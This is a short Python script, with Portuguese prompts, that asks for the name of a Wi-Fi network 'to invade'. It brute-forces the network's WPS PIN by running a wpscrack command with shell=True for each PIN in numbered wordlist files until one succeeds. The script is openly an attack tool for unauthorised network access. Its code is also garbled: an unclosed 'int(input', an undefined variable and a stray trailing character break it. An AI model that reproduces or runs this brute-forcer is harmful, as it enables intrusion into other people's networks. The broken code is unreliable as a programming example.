import time
import os
import netifaces
import subprocess

os.system("clear")
def get_wifi_interface():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if "wlan" in interface:
            return interface
    return None

wifi_interface = get_wifi_interface()
time.sleep(1)
if wifi_interface:
    print(f"Nome da interface Wi-Fi: {wifi_interface} (coloque a baixo)")
else:
    print("Nenhuma interface Wi-Fi encontrada.")
time.sleep(1)
print("")
print("Digite onde você deseja começar.")
int(input
s="0"
s=str(n)


ssid = input("Qual o nome da rede que deseja invadir? ")
while True:
    pins_file = "wordlistofc"+s+".txt"
    def connect_wifi(pin):
        command = f"wpscrack -i {wifi_interface} -s {ssid} -p {pin}"
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        return output.stdout

    def main():
        with open(pins_file, "r") as file:
            pins = file.readlines()
            for pin in pins:
                pin = pin.strip()
                print(f"Testando PIN: {pin}")
                result = connect_wifi(pin)
                if "SUCCESS" in result:
                    print(f"Successo! PIN: {pin}")
                    exit()
                else:
                    print("PIN inválido")

    if __name__ == "__main__":
        main()
    p
